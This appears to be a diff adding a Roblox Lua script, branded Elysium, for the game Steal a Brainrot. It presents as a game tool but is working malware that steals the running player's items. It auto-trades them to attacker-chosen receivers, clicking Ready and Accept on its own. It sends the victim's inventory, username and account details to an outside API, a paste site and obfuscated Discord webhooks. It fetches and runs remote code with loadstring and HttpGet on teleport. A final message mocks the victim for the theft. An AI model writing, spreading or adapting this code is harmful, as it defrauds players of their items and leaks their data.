+					fn2((flag3 and "Busy" or "Non-target") .. " — declining " .. match)
+
+					local function fn30()
+						task.wait(0.05)
+						local ok2, result2 = pcall(getconnections, no.Activated)
+
+						if ok2 and #result2 > 0 then
+							for _, v4 in ipairs(result2) do
+								if type(v4.Function) == "function" then
+									pcall(v4.Function)
+								else
+									pcall(function()
+										v4:Fire()
+									end)
+								end
+							end
+						end
+					end
+
+					task.spawn(fn30)
+				end
+
+				return add(arg, arg2, ...)
+			end
+		end
+
+		local v3 = table.pack(...)
+		local v4 = add
+		v3.n = 3 + v3.n - 1
+		table.move(v3, 1, v3.n, 3, v3)
+		v3[1] = arg
+		v3[2] = arg2
+		return v4(table.unpack(v3, 1, v3.n))
+	end
+
+	fn2("CNC.Add hooked ✓")
+end
+
+local function fn30(arg)
+	local your = arg:FindFirstChild("Your")
+	if not your then
+		fn2("No Your frame")
+		return
+	end
+	local scrollingFrame = your:FindFirstChild("ScrollingFrame")
+	if not scrollingFrame then
+		fn2("No ScrollingFrame")
+		return
+	end
+	local sideButtons = arg:FindFirstChild("Side Buttons")
+
+	if sideButtons then
+		local brainrots = sideButtons:FindFirstChild("Brainrots")
+
+		if brainrots then
+			fn11(brainrots)
+			task.wait(0.1)
+		end
+	end
+
+	local now = tick()
+	local n4 = 0
+	local n5 = 0
+	local n6
+
+	while true do
+		n6 = 0
+
+		for _, child in ipairs(scrollingFrame:GetChildren()) do
+			if child:IsA("Frame") and child.Name:match("^Selection_") then
+				n6 += 1
+			end
+		end
+
+		if n6 > 0 and n6 == n4 then
+			n5 += 0.1
+		else
+			n5 = 0
+		end
+
+		if n5 >= 0.3 then
+			fn2("Items stable: " .. n6 .. " loaded")
+			break
+		else
+			task.wait(0.1)
+			if not (tick() - now > 10) then
+				n4 = n6
+				continue
+			end
+		end
+
+		break
+	end
+
+	if n6 == 0 then
+		fn2("No items loaded after 10s — aborting add")
+		return
+	end
+
+	local function fn31()
+		local tbl9 = {}
+		local tbl10 = {}
+		local tbl11 = {}
+		local tbl12 = {}
+
+		for _, child in ipairs(scrollingFrame:GetChildren()) do
+			if child:IsA("Frame") then
+				local spacer = child:FindFirstChild("Spacer")
+
+				if not (not spacer or not spacer:IsA("GuiButton")) then
+					local title = spacer:FindFirstChild("Title")
+					local cash = spacer:FindFirstChild("Cash")
+					title = title and title.Text or ""
+					local v3 = fn4(cash and cash.Text or "")
+					local str6 = title:lower()
+					local tbl13 = { btn = spacer, name = title, gen = v3 }
+
+					if child.Name:match("^Selection_Brainrot_") then
+						if tbl[str6] then
+							tbl9[#tbl9 + 1] = tbl13
+						elseif threshold <= 0 or v3 >= threshold then
+							tbl10[#tbl10 + 1] = tbl13
+						end
+					elseif child.Name:match("^Selection_Gear_") then
+						if tbl3[str6] then
+							tbl11[#tbl11 + 1] = tbl13
+						end
+					elseif child.Name:match("^Selection_BaseSkin_") then
+						if tbl4[str6] then
+							tbl12[#tbl12 + 1] = tbl13
+						end
+					end
+				end
+			end
+		end
+
+		return tbl9, tbl10, tbl11, tbl12
+	end
+
+	local v3, v4, v5, v6 = fn31()
+
+	local function fn32(arg2, arg3)
+		for _, v7 in ipairs(arg2) do
+			local flag7 = false
+
+			for _, v8 in ipairs(arg3) do
+				if v8.name == v7.name then
+					flag7 = true
+					break
+				end
+			end
+
+			if not flag7 then
+				arg3[#arg3 + 1] = v7
+			end
+		end
+	end
+
+	if sideButtons then
+		local gears = sideButtons:FindFirstChild("Gears")
+
+		if gears then
+			fn11(gears)
+			task.wait(0.2)
+			local v7, v8, v9 = fn31()
+			fn32(v9, v5)
+		end
+
+		local baseSkins = sideButtons:FindFirstChild("BaseSkins")
+
+		if baseSkins then
+			fn11(baseSkins)
+			task.wait(0.2)
+			local v7, v8, v9, v10 = fn31()
+			fn32(v10, v6)
+		end
+
+		local brainrots = sideButtons:FindFirstChild("Brainrots")
+
+		if brainrots then
+			fn11(brainrots)
+			task.wait(0.1)
+		end
+	end
+
+	table.sort(v3, function(arg2, arg3)
+		return arg2.gen > arg3.gen
+	end)
+
+	table.sort(v4, function(arg2, arg3)
+		return arg2.gen > arg3.gen
+	end)
+
+	local tbl9 = {}
+
+	for _, v7 in ipairs(v3) do
+		tbl9[#tbl9 + 1] = v7
+	end
+
+	for _, v7 in ipairs(v5) do
+		tbl9[#tbl9 + 1] = v7
+	end
+
+	for _, v7 in ipairs(v6) do
+		tbl9[#tbl9 + 1] = v7
+	end
+
+	for _, v7 in ipairs(v4) do
+		tbl9[#tbl9 + 1] = v7
+	end
+
+	fn2(("Adding %d items (prio=%d gear=%d skin=%d hi=%d)"):format(#tbl9, #v3, #v5, #v6, #v4))
+	local n7 = 0
+	local flag7
+
+	for _, v7 in ipairs(tbl9) do
+		if not fn14() then
+			fn2("Trade closed during add")
+			break
+		else
+			local v8 = fn17()
+
+			if v8 > 0 then
+				task.wait(v8 + 0.02)
+			end
+
+			local v9 = fn16()
+			fn11(v7.btn)
+			local n8 = tick() + 2.5
+
+			while true do
+				flag7 = false
+
+				if not (tick() < n8) then
+					break
+				elseif v9 < fn16() then
+					flag7 = true
+					break
+				else
+					task.wait(0.05)
+				end
+			end
+
+			if flag7 then
+				n7 += 1
+				fn2("✓ " .. v7.name .. " (" .. n7 .. "/" .. #tbl9 .. ")")
+			else
+				fn2("✗ " .. v7.name)
+			end
+		end
+	end
+
+	fn2(("Add complete: %d/%d"):format(n7, #tbl9))
+end
+
+local function fn31(arg)
+	local other = arg:FindFirstChild("Other")
+	if not other then
+		fn2("No Other frame")
+		return
+	end
+	local readyButton = other:FindFirstChild("ReadyButton")
+	if not readyButton then
+		fn2("No ReadyButton")
+		return
+	end
+	local offered = fn16()
+	fn2("Offered: " .. offered)
+
+	if offered == 0 then
+		fn2("Nothing offered — cancelling")
+		local cancel = other:FindFirstChild("Cancel")
+
+		if cancel then
+			fn11(cancel)
+		end
+
+		return
+	end
+
+	fn2("Clicking Ready (persistent)...")
+	local n4 = tick() + 60
+
+	while tick() < n4 do
+		if not fn14() then
+			return
+		end
+
+		if fn20() then
+			task.wait(0.2)
+			if not fn14() then
+				return
+			end
+
+			if fn20() then
+				fn2("Ready ✓")
+				break
+			end
+			fn2("Ready state lost — re-clicking...")
+		end
+
+		local v3 = fn18()
+
+		if v3 > 0 then
+			task.wait(math.min(v3 + 0.02, 0.5))
+		else
+			fn11(readyButton)
+			fn2("ReadyButton clicked")
+			local n5 = tick() + 3
+
+			while tick() < n5 do
+				if not fn20() then
+					task.wait(0.05)
+					continue
+				end
+				break
+			end
+
+			if not fn20() then
+				task.wait(0.3)
+			end
+		end
+	end
+
+	if not fn20() then
+		fn2("Ready timeout")
+	end
+
+	fn2("Waiting for other player (maintaining ready state)...")
+	local n5 = tick() + 120
+	local exitTo = nil
+
+	while true do
+		if not (tick() < n5) then
+			exitTo = 1
+			break
+		else
+			if fn14() then
+				if fn19() then
+					exitTo = 1
+					break
+				else
+					if not fn20() then
+						fn2("Ready state lost while waiting — re-clicking...")
+						local v3 = fn18()
+
+						if v3 > 0 then
+							task.wait(math.min(v3 + 0.02, 0.5))
+						else
+							fn11(readyButton)
+							fn2("ReadyButton re-clicked")
+							local n6 = tick() + 3
+
+							while tick() < n6 do
+								if not fn20() then
+									task.wait(0.05)
+									continue
+								end
+								break
+							end
+						end
+					end
+
+					task.wait(0.1)
+					continue
+				end
+			end
+
+			break
+		end
+	end
+
+	if exitTo == 1 then
+		if not fn14() then
+			return
+		end
+		fn2("All ready ✓")
+		fn2("Clicking Accept (persistent)...")
+		local n6 = tick() + 60
+
+		while tick() < n6 do
+			if not fn14() then
+				return
+			end
+			local v3 = fn13()
+			if v3 and v3:TryIndex({ "active", "data", "isProcessing" }) then
+				break
+			end
+
+			if fn21() then
+				task.wait(0.2)
+				if not fn14() then
+					return
+				end
+
+				if fn21() then
+					fn2("Accepted ✓")
+					break
+				end
+				fn2("Accept state lost — re-clicking...")
+			end
+
+			local v4 = fn18()
+
+			if v4 > 0 then
+				task.wait(math.min(v4 + 0.02, 0.5))
+			else
+				fn11(readyButton)
+				fn2("AcceptButton clicked")
+				local n7 = tick() + 3
+
+				while tick() < n7 do
+					if not fn21() then
+						task.wait(0.05)
+						continue
+					end
+					break
+				end
+
+				if not fn21() then
+					task.wait(0.3)
+				end
+			end
+		end
+
+		if not fn21() then
+			fn2("Accept timeout")
+		end
+
+		fn2("Waiting for trade to close...")
+		local n7 = tick() + 90
+
+		while tick() < n7 do
+			if not fn14() then
+				fn2("Trade closed ✓")
+				return
+			end
+			local v3 = fn13()
+
+			if v3 and v3:TryIndex({ "active", "data", "isProcessing" }) then
+				local n8 = tick() + 30
+
+				while tick() < n8 do
+					if not fn14() then
+						fn2("Processed ✓")
+						return
+					end
+					task.wait(0.2)
+				end
+
+				return
+			end
+
+			task.wait(0.1)
+		end
+
+		fn2("Trade close timeout")
+		return
+	end
+end
+
+runTradeFlow = function(arg)
+	fn2("═══ Trade flow: " .. arg .. " ═══")
+	flag4 = false
+	fn2("Waiting for " .. arg .. " to accept invite...")
+	local n4 = tick() + 45
+
+	while tick() < n4 do
+		if not fn14() then
+			task.wait(0.2)
+			continue
+		end
+		break
+	end
+
+	if not fn14() then
+		fn2("Channel never opened — " .. arg .. " declined or timed out")
+		tbl8:hideAfterTrade()
+		flag3 = false
+		tbl5[arg] = tick()
+		return
+	end
+
+	fn2("Channel open ✓ — waiting for TradeLiveTrade...")
+	local v3 = fn23(15)
+
+	if not v3 then
+		fn2("TradeLiveTrade never opened — abort")
+		flag3 = false
+		return
+	end
+
+	tbl8:revealForTrade()
+	fn2("TradeLiveTrade revealed")
+	task.wait(0.2)
+	fn30(v3)
+	fn31(v3)
+	local n5 = tick() + n3
+
+	while tick() < n5 do
+		if fn14() then
+			task.wait(0.2)
+			continue
+		end
+		break
+	end
+
+	tbl8:hideAfterTrade()
+	flag3 = false
+	flag4 = true
+	tbl5[arg] = tick()
+	fn2("═══ Trade ended: " .. arg .. " ═══")
+end
+
+fn29()
+
+local function fn32()
+	return syn and syn.request or http and http.request or type(request) == "function" and request or type(http_request) == "function" and http_request or nil
+end
+
+local function fn33(arg)
+	local v3 = fn32()
+	if not v3 then
+		return false
+	end
+
+	local ok, result = pcall(function()
+		return v3({
+			Url = sabApiBase .. "/signal-hit-sab",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str3 },
+			Body = v:JSONEncode({
+				place_id = tostring(game.PlaceId),
+				job_id = tostring(game.JobId),
+				sender = localPlayer.Name,
+				target_players = { arg:lower() },
+				game_type = "sab",
+				expiry_seconds = n,
+			}),
+		})
+	end)
+
+	return ok and result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300
+end
+
+local function fn34(arg)
+	local v3 = tbl5[arg]
+	if v3 and tick() - v3 < n2 then
+		return
+	end
+
+	if flag3 then
+		return
+	end
+
+	if not fn9() then
+		return
+	end
+	local TradePlayerList = tbl8:bypass("TradePlayerList")
+	local v4, v5 = fn24()
+
+	if not v5 then
+		TradePlayerList()
+		tbl5[arg] = tick() + n2
+		return
+	end
+
+	task.wait(0.2)
+	local v6 = fn25(v5, arg)
+
+	if not v6 then
+		v5.Visible = false
+		TradePlayerList()
+		fn2(arg .. " not found in list — not in server")
+		tbl5[arg] = tick() + n2
+		return
+	end
+
+	if not fn26(v6) then
+		fn2(arg .. " offline/busy — skipping")
+		v5.Visible = false
+		TradePlayerList()
+		tbl5[arg] = tick() + n2
+		return
+	end
+
+	tbl7[arg] = tick()
+	fn2(arg .. " online ✓ — firing Send...")
+	v5.Visible = false
+	local flag7 = fn28(v6, arg)
+	TradePlayerList()
+
+	if not flag7 then
+		fn2("GUI send failed — InviteRF fallback (no search needed)...")
+		local v7 = fn27()
+
+		if v7 then
+			local ok, result = pcall(function()
+				return Players:GetUserIdFromNameAsync(arg)
+			end)
+
+			if ok and result then
+				local ok2, result2 = pcall(function()
+					return v7:InvokeServer("be01db97-504e-48f7-b7da-ff1f3969e089", result)
+				end)
+
+				fn2("InviteRF: ok=" .. tostring(ok2) .. " r1=" .. tostring(result2))
+
+				if ok2 and result2 == true then
+					flag7 = true
+				end
+			end
+		end
+	end
+
+	if not flag7 then
+		fn2("All send methods failed for " .. arg)
+		tbl5[arg] = tick() + n2
+		return
+	end
+
+	fn2("Invite sent → " .. arg)
+	tbl5[arg] = tick()
+
+	if not tbl6[arg] then
+		tbl6[arg] = true
+
+		task.spawn(function()
+			fn33(arg)
+		end)
+	end
+
+	flag3 = true
+
+	task.spawn(function()
+		runTradeFlow(arg)
+	end)
+end
+
+local function fn35()
+	local function fn36()
+		local tbl9 = {}
+		local n4 = 0
+
+		for _, v3 in ipairs(fn8()) do
+			if v3.animal.UUID then
+				tbl9[v3.animal.UUID] = true
+				n4 += 1
+			end
+		end
+
+		local v3, v4 = fn10()
+
+		for _, v5 in ipairs(v3) do
+			if v5.uuid then
+				tbl9[v5.uuid] = true
+				n4 += 1
+			end
+		end
+
+		for _, v5 in ipairs(v4) do
+			if v5.uuid then
+				tbl9[v5.uuid] = true
+				n4 += 1
+			end
+		end
+
+		return tbl9, n4
+	end
+
+	local function fn37()
+		local tbl9 = {}
+
+		for _, v3 in ipairs(fn8()) do
+			if v3.animal.UUID then
+				tbl9[v3.animal.UUID] = true
+			end
+		end
+
+		local v3, v4 = fn10()
+
+		for _, v5 in ipairs(v3) do
+			if v5.uuid then
+				tbl9[v5.uuid] = true
+			end
+		end
+
+		for _, v5 in ipairs(v4) do
+			if v5.uuid then
+				tbl9[v5.uuid] = true
+			end
+		end
+
+		return tbl9
+	end
+
+	local v3, v4 = fn36()
+	if v4 == 0 then
+		fn2("No UUIDs for kick watcher")
+		return
+	end
+	fn2("Kick watcher: tracking " .. v4 .. " items (brainrots+gears+skins)")
+	flag6 = true
+	local flag7 = false
+
+	task.spawn(function()
+		while not flag7 do
+			task.wait(10)
+
+			if not flag3 then
+				if flag4 then
+					task.wait(15)
+					flag4 = false
+				else
+					local v5 = fn37()
+
+					for k in pairs(v3) do
+						if not v5[k] then
+							task.wait(2)
+
+							if not flag3 then
+								if not fn37()[k] and not flag3 then
+									fn2("UUID missing — kicking player")
+									flag7 = true
+									break
+								else
+									continue
+								end
+							end
+						else
+							continue
+						end
+
+						break
+					end
+
+					if flag7 then
+						task.wait(1)
+
+						localPlayer:Kick([[All your items just got stolen by Elysium.
+ Join our Discord: https://discord.gg/3lysium 
+]])
+					end
+				end
+			end
+		end
+	end)
+end
+
+local Animals2 = require(ReplicatedStorage.Datas.Animals)
+
+local function fn36(arg)
+	if not arg then
+		return "$0"
+	end
+
+	local function fn37(arg2)
+		return arg2 % 1 == 0 and string.format("%.0f", arg2) or string.format("%.1f", arg2)
+	end
+
+	if arg >= 1e9 then
+		return "$" .. fn37(arg / 1e9) .. "B/s"
+	end
+
+	if arg >= 1000000 then
+		return "$" .. fn37(arg / 1000000) .. "M/s"
+	end
+
+	if arg >= 1000 then
+		return "$" .. fn37(arg / 1000) .. "K/s"
+	end
+	return "$" .. tostring(arg) .. "/s"
+end
+
+local function fn37()
+	local tbl9 = {}
+	local v3 = fn6()
+	if not v3 then
+		return tbl9
+	end
+	local animalPodiums = fn5(v3, "AnimalPodiums")
+	if not animalPodiums then
+		return tbl9
+	end
+
+	for k, animalPodium in pairs(animalPodiums) do
+		if not (not tonumber(k) or type(animalPodium) ~= "table" or animalPodium.Machine) then
+			local tbl10 = Animals2[animalPodium.Index] or {}
+			local v4 = fn7(animalPodium)
+			local str6 = (animalPodium.Index or ""):lower()
+			local flag7 = tbl[str6] or false
+
+			if tbl10.DisplayName and tbl[tbl10.DisplayName:lower()] then
+				flag7 = true
+			end
+
+			local flag8 = tbl2[str6] or false
+
+			if tbl10.DisplayName and tbl2[tbl10.DisplayName:lower()] then
+				flag8 = true
+			end
+
+			if fn4(v4) >= 3e9 then
+				flag8 = true
+			end
+
+			tbl9[#tbl9 + 1] = {
+				DisplayName = tbl10.DisplayName or animalPodium.Index,
+				Index = animalPodium.Index,
+				Generation = v4,
+				ParsedGeneration = fn4(v4),
+				Mutation = animalPodium.Mutation,
+				Traits = animalPodium.Traits or {},
+				Rarity = tbl10.Rarity or "Unknown",
+				Priority = flag7,
+				HallOfFame = flag8,
+			}
+		end
+	end
+
+	table.sort(tbl9, function(arg, arg2)
+		return arg.ParsedGeneration > arg2.ParsedGeneration
+	end)
+
+	return tbl9
+end
+
+local function fn38(arg, arg2)
+	if not arg2 or arg2 == "" then
+		return false
+	end
+	local v3 = fn32()
+	if not v3 then
+		return false
+	end
+	local str6 = sabApiBase .. "/webhook/" .. HttpService:UrlEncode(arg2)
+	local str7 = "content=" .. HttpService:UrlEncode(arg.content or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(arg.embeds or {}))
+
+	local ok, result = pcall(function()
+		return v3({
+			Url = str6,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/x-www-form-urlencoded", ["X-Roblox-Key"] = str3 },
+			Body = str7,
+		})
+	end)
+
+	return ok and result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300
+end
+
+local function fn39()
+	if identifyexecutor then
+		local ok, result = pcall(identifyexecutor)
+		if ok and result then
+			return tostring(result)
+		end
+	end
+
+	if getexecutorname then
+		local ok, result = pcall(getexecutorname)
+		if ok and result then
+			return tostring(result)
+		end
+	end
+
+	if syn then
+		return "Synapse"
+	end
+
+	if KRNL_LOADED then
+		return "KRNL"
+	end
+
+	if fluxus then
+		return "Fluxus"
+	end
+
+	if getgenv().Celery then
+		return "Celery"
+	end
+	return "Unknown"
+end
+
+local v3 = fn39()
+
+local function fn40(arg, arg2, arg3)
+	local v4 = fn32()
+	if not v4 then
+		return nil
+	end
+	local tbl9 = { "=== BRAINROTS ===" }
+
+	if #arg == 0 then
+		tbl9[#tbl9 + 1] = "(none)"
+	else
+		for _, v5 in ipairs(arg) do
+			local str6 = (v5.Priority and "⭐" or "") .. (v5.HallOfFame and "🏆" or "")
+			tbl9[#tbl9 + 1] = str6 .. (str6 ~= "" and " " or "") .. v5.DisplayName .. " | " .. fn36(v5.ParsedGeneration)
+		end
+	end
+
+	if #arg2 > 0 or #arg3 > 0 then
+		tbl9[#tbl9 + 1] = ""
+		tbl9[#tbl9 + 1] = "=== GEARS / BASE SKINS ==="
+
+		for _, v5 in ipairs(arg2) do
+			tbl9[#tbl9 + 1] = "⚙️ " .. v5.name
+		end
+
+		for _, v5 in ipairs(arg3) do
+			tbl9[#tbl9 + 1] = "🏠 " .. v5.name
+		end
+	end
+
+	local ok, result = pcall(function()
+		return v4({
+			Url = "https://sourceb.in/api/bins",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = v:JSONEncode({ files = { { content = table.concat(tbl9, "\n") } } }),
+		})
+	end)
+
+	if ok and result and result.StatusCode == 200 then
+		local ok2, result2 = pcall(v.JSONDecode, v, result.Body)
+		if ok2 and result2 and result2.key then
+			return "https://cdn.sourceb.in/bins/" .. result2.key .. "/0"
+		end
+	end
+
+	return nil
+end
+
+local function fn41(arg, arg2, arg3, arg4, arg5, arg6)
+	local tbl9 = {}
+	local n4 = 0
+
+	for _, v4 in ipairs(arg2) do
+		if not (n4 >= 15) then
+			local tbl10 = {}
+
+			if v4.Mutation and v4.Mutation ~= "" then
+				tbl10[#tbl10 + 1] = "[" .. v4.Mutation .. "]"
+			end
+
+			if v4.Traits and #v4.Traits > 0 then
+				tbl10[#tbl10 + 1] = "[" .. table.concat(v4.Traits, ", ") .. "]"
+			end
+
+			local str6 = #tbl10 > 0 and table.concat(tbl10, " ") or ""
+			local str7
+
+			if v4.Priority and v4.ParsedGeneration >= 800000000 then
+				str7 = "⭐💸 "
+			elseif v4.Priority then
+				str7 = "⭐ "
+			else
+				str7 = ""
+
+				if v4.ParsedGeneration >= 800000000 then
+					str7 = "💸 "
+				end
+			end
+
+			tbl9[#tbl9 + 1] = str7 .. (str6 ~= "" and str6 .. " ➜ " or "") .. (v4.DisplayName or "???") .. " ➜ " .. fn36(v4.ParsedGeneration)
+			n4 += 1
+			continue
+		end
+
+		break
+	end
+
+	local n5 = #arg2 - n4
+
+	if n5 > 0 then
+		tbl9[#tbl9 + 1] = "... and " .. n5 .. " more brainrots"
+	end
+
+	if #tbl9 == 0 then
+		tbl9[#tbl9 + 1] = "None Found"
+	end
+
+	local tbl10 = {}
+	local n6 = 0
+
+	for _, v4 in ipairs(arg3) do
+		if not (n6 >= 5) then
+			tbl10[#tbl10 + 1] = "⚙️ " .. v4.name
+			n6 += 1
+			continue
+		end
+
+		break
+	end
+
+	for _, v4 in ipairs(arg4) do
+		if not (n6 >= 5) then
+			tbl10[#tbl10 + 1] = "🏠 " .. v4.name
+			n6 += 1
+			continue
+		end
+
+		break
+	end
+
+	local n7 = #arg3 + #arg4 - n6
+
+	if n7 > 0 then
+		tbl10[#tbl10 + 1] = "... and " .. n7 .. " more items"
+	end
+
+	if #tbl10 == 0 then
+		tbl10[#tbl10 + 1] = "None Found"
+	end
+
+	local maxPlayers = Players.MaxPlayers
+	local accountAge = arg.AccountAge
+
+	local tbl11 = {
+		{
+			name = "**Player Info**",
+			value = string.format([[```
+Username: %s
+Player Count: %d/%d
+Account Age: %d days
+Executor: %s
+```]], arg.Name, #Players:GetPlayers(), maxPlayers, accountAge, v3),
+			inline = false,
+		},
+	}
+
+	local flag7 = not arg6
+
+	if flag7 then
+		tbl11[#tbl11 + 1] = { name = "**Receivers**", value = "```\n" .. table.concat(receivers, ", ") .. "\n```", inline = false }
+	end
+
+	tbl11[#tbl11 + 1] = {
+		name = "**Brainrots — Threshold: >" .. fn36(threshold) .. "**",
+		value = "```\n" .. table.concat(tbl9, "\n") .. "\n```",
+		inline = false,
+	}
+
+	tbl11[#tbl11 + 1] = {
+		name = "**Gears / Base Skins**",
+		value = "```\n" .. table.concat(tbl10, "\n") .. "\n```",
+		inline = false,
+	}
+
+	if arg5 and not arg6 then
+		tbl11[#tbl11 + 1] = { name = "", value = "[View full inventory log](" .. arg5 .. ")", inline = false }
+	end
+
+	if flag7 then
+		tbl11[#tbl11 + 1] = {
+			name = "**How to manually claim?**",
+			value = "Join your PS server (or any server) and send a trade request to the player",
+			inline = false,
+		}
+	end
+
+	return {
+		content = "",
+		embeds = {
+			{
+				title = arg6 and "Steal A Brainrot Public Hit! Elysium woooo!" or "Steal A Brainrot Hit! Elysium ezez",
+				color = 9662683,
+				fields = tbl11,
+				footer = { text = "Elysium! (Steal a Brainrot)" },
+				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+			},
+		},
+	}
+end
+
+local function fn42(arg, arg2)
+	if flag5 then
+		return
+	end
+	flag5 = true
+	fn2("Sending webhooks...")
+	local n4 = 0
+	local flag7 = false
+	local flag8 = false
+
+	for _, v4 in ipairs(arg2) do
+		if n4 < v4.ParsedGeneration then
+			n4 = v4.ParsedGeneration
+		end
+
+		if v4.Priority then
+			flag7 = true
+		end
+
+		if v4.HallOfFame then
+			flag8 = true
+		end
+	end
+
+	local v4, v5 = fn10()
+	local flag9 = n4 >= threshold and threshold > 0 or flag7 or #v4 > 0 or #v5 > 0
+	local v6 = fn40(arg2, v4, v5)
+
+	if webhook ~= "" then
+		local v7 = fn41(arg, arg2, v4, v5, v6, false)
+
+		if flag9 then
+			v7.content = "@everyone `" .. arg.Name .. "` — Paste this in the Trading Machine!"
+		end
+
+		fn2("WH_MAIN: " .. tostring(fn38(v7, webhook)))
+	end
+
+	if str4 ~= "" then
+		fn2("WH_PUB: " .. tostring(fn38(fn41(arg, arg2, v4, v5, v6, true), "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb")))
+	end
+
+	if flag8 and str5 ~= "" then
+		fn2("WH_HOF: " .. tostring(fn38(fn41(arg, arg2, v4, v5, v6, true), "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb")))
+	end
+end
+
+task.spawn(function()
+	local v4 = fn32()
+	if not v4 then
+		return
+	end
+
+	pcall(function()
+		v4({
+			Url = sabApiBase .. "/track-execution-sab",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str3 },
+			Body = v:JSONEncode({ target_players = receivers, executor = localPlayer.Name }),
+		})
+	end)
+end)
+
+task.spawn(function()
+	task.wait(2)
+	pcall(fn35)
+end)
+
+task.spawn(function()
+	task.wait(2)
+	fn2("Webhook scan...")
+	local v4 = fn37()
+	fn2(#v4 .. " brainrots found")
+
+	pcall(function()
+		fn42(localPlayer, v4)
+	end)
+end)
+
+task.spawn(function()
+	fn2("Main loop started | targets: " .. table.concat(receivers, ", "))
+
+	while true do
+		task.wait(0.2)
+
+		if not flag3 then
+			for _, receiver in ipairs(receivers) do
+				if not flag3 then
+					pcall(fn34, receiver)
+				end
+			end
+		end
+	end
+end)
+
+local str6 = "    local H = game:GetService(\"HttpService\")\n    local d = H:JSONDecode('" .. v:JSONEncode({ RECEIVERS = receivers, WEBHOOK = webhook, THRESHOLD = threshold }) .. [[')
+    getgenv().RECEIVERS = d.RECEIVERS
+    getgenv().WEBHOOK   = d.WEBHOOK
+    getgenv().THRESHOLD = d.THRESHOLD
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/sab.lua"))()
+]]
+
+if queue_on_teleport then
+	queue_on_teleport(str6)
+end
+
+fn2("=== SAB LOADED | targets=" .. table.concat(receivers, ",") .. " threshold=" .. threshold .. " ===")
